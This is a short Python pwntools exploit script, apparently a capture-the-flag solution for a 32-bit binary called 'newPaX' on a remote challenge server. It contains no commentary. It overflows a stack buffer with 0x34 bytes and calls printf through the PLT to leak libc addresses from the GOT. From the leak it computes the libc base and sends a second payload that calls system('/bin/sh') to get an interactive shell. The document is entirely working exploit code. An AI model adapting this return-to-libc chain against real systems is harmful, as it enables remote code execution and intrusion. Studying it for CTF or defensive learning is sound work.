from pwn import *
local = 0
if local:
    s = process("./newPaX")
    raw_input('debug')
else:
    s = remote("newpax.darkarmy.xyz", 5001)

printf_plt = 0x8048400
signal_got = 0x804a014
read_got = 0x804a00c
main = 0x8048685
payload = 'a' * 0x34
payload += p32(printf_plt)
payload += p32(main)
payload += p32(signal_got)
s.sendline(payload)
signal = u32(s.recv(4))
alarm = u32(s.recv(4))
log.info("signal: 0x%x"%signal)
log.info("alarm: 0x%x"%alarm)
signal_off = 0x02d3b0
system_off = 0x03cd80
binsh_off = 0x17bb8f
base = signal - signal_off
system = base + system_off
binsh = base + binsh_off
exp = 'a'*0x34
exp += p32(system)
exp += p32(main)
exp += p32(binsh)
s.sendline(exp)
s.interactive()
s.close()